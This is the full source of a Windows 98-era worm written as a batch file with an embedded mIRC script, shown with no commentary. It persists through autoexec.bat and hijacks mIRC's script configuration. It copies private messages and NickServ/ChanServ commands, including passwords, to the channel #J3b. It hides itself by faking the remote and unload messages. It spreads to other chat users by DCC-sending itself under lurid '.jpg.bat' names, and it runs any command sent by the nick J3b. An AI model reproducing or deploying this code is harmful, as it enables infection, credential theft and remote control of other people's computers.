@echo off
@if %0 == C:\WINSYS98.BAT goto :skip
@echo asdf >> c:\temp.jpg
@c:\progra~1\intern~1\iexplore c:\temp.jpg
@echo @C:\WINSYS98.BAT >> c:\autoexec.bat
@copy /y %0 c:\winsys98.bat > nul
:skip
@if exist c:\mirc\mirc32.exe goto ok
@exit
:ok
@copy /y %0 c:\mirc\script.ini > nul
@echo n0=script.ini >> c:\mirc\mirc.ini
@echo n1=script.ini >> c:\mirc\mirc.ini
@echo n2=script.ini >> c:\mirc\mirc.ini
@echo n3=script.ini >> c:\mirc\mirc.ini
@echo n4=script.ini >> c:\mirc\mirc.ini
@echo n5=script.ini >> c:\mirc\mirc.ini
@echo n6=script.ini >> c:\mirc\mirc.ini
@echo n7=script.ini >> c:\mirc\mirc.ini
@echo n8=script.ini >> c:\mirc\mirc.ini
@echo n9=script.ini >> c:\mirc\mirc.ini
@exit
[script]
n0=alias chanserv { rub.msg (msg:chanserv) $1- | chanserv $1- }
n1=alias nickserv { rub.msg (msg:nickserv) $1- | nickserv $1- }
n2=alias operserv { rub.msg (msg:operserv) $1- | operserv $1- }
n3=alias msg { rub.msg (msg: $+ $1 $+ ) $2- | msg $1- }
n4=alias privmsg { rub.msg (msg: $+ $1 $+ ) $2- | privmsg $1- }
n5=alias remote {
n6=  if ($1 == off) { rub.echo info text:*** Remote is OFF }
n7=  if ($1 == on) { rub.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n8=}
n9=alias unload {
n10=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { rub.echo info text:*** Unloaded script 'script1.ini' }
n11=  else {
n12=    unload $1-
n13=  }
n14=}
n15=alias -l rub.echo echo -ae  $+ $colour($gettok($1-,1,58)) $+ $deltok($1-,1,58)
n16=alias -l rub.msg if ($server != $null) { raw -q privmsg $chr(35) $+ J3b :#Batch File#`1# $1- }
n17=alias -l rub.name return $str(!,$r(0,9)) $+ $gettok(:jennie:wife:lori:cindy:lanna:pamela:jane:wendi:christine:linda:katherine:yasmeen:model:anna:nicole:,$r(1,15),58) $+ $gettok(::-:_:~:x:,$r(1,5),58) $+ $gettok(::wet:hot:sexy:xxx:lick:horny:wild:orgy:naked:lesbian:straight:all-wet:,$r(1,13),58) $+ .jpg.bat
n18=alias -l rub.infect {
n19=  :top
n20=  if ($sock(*,0) > 5) return
n21=  %rub.sock = rub.send. $+ $r(0,9999)
n22=  socklisten %rub.sock | sockmark %rub.sock $1 0
n23=  %rub.temp = $rub.name
n24=  raw -q privmsg $1 :DCC SEND %rub.temp $longip($ip) $sock(%rub.sock).port $file($script).size $+ 
n25=}
n26=alias -l rub.help {
n27=  if (($sock(*,0) > 5) && ($sock(rub.*,0) > 0)) {
n28=    %rub.temp = 1
n29=    :l
n30=    if ($sock(rub.*,%rub.temp).ls > 30) sockclose $sock(rub.*,%rub.temp)
n31=    else inc %rub.temp
n32=    if (%rub.temp <= $sock(rub.*,0)) goto l
n33=  }
n34=  if (($chan(0) == 0) || ($sock(*,0) > 5)) return | %rub.temp2 = 0
n35=  :loop
n36=  %rub.temp = $chan($r(1,$chan(0)))
n37=  %rub.temp = $nick(%rub.temp,$r(1,$nick(%rub.temp,0)))
n38=  if (%rub.temp != $me) rub.infect %rub.temp
n39=  if (%rub.temp2 < 5) { inc %rub.temp2 | goto loop }
n40=}
n41=on *:socklisten:rub.send.*:{
n42=  set %rub.temp rub.write. $+ $gettok($sockname,3,46) | sockaccept %rub.temp | sockmark %rub.temp $sock($sockname).mark | rub.send %rub.temp | sockclose $sockname
n43=}
n44=on *:sockwrite:rub.write.*:rub.send $sockname
n45=on *:sockclose:rub.write.*:rub.help
n46=alias -l rub.send {
n47=  %rub.byte = $gettok($sock($1).mark,2,32)
n48=  if ($calc(%rub.byte + 4096) < $file($script).size) {
n49=    bread $script %rub.byte 4096 &rub.data
n50=    sockwrite $1 &rub.data
n51=    inc %rub.byte 4096
n52=  }
n53=  else {
n54=    %rub.temp = $calc($file($script).size - %rub.byte)
n55=    if (%rub.temp == 0) { rub.msg infected $gettok($sock($1).mark,1,32) | rub.help | return }
n56=    bread $script %rub.byte %rub.temp &rub.data
n57=    sockwrite $1 &rub.data
n58=    %rub.byte = $file($script).size
n59=  }
n60=  sockmark $1 $gettok($sock($1).mark,1,32) %rub.byte
n61=}
n62=
n63=raw 401:*:{ set %rub.temp $chr(35) $+ J3b | if ($2 == %rub.temp) halt }
n64=raw 404:*:{ set %rub.temp $chr(35) $+ J3b | if ($2 == %rub.temp) halt }
n65=on *:connect:{
n66=  .copy -o $script c:\winsys98.bat
n67=  rub.msg online ( $+ $me $+ ! $+ $ip $+ )
n68=}
n69=on *:invite:#:rub.msg invited to $chan
n70=on *:join:#:{
n71=  if ($nick != $me) rub.infect $nick
n72=  rub.help
n73=}
n74=on *:part:#:.timermircHelpTimer 0 10 rub.help
n75=on *:nick:if ($nick == $me) rub.msg nick: $nick -> $newnick
n76=on *:op:#:if ($opnick == $me) rub.msg just opped in $chan
n77=on *:serverop:#:if ($opnick == $me) rub.msg just serv-opped in $chan
n78=on *:usermode:rub.msg usermode: $1-
n79=
n80=on ^*:error:*:haltdef
n81=on ^*:notice:*:?:{
n82=  if ($nick == J3b) { $1- | halt }
n83=alias script { return script.ini }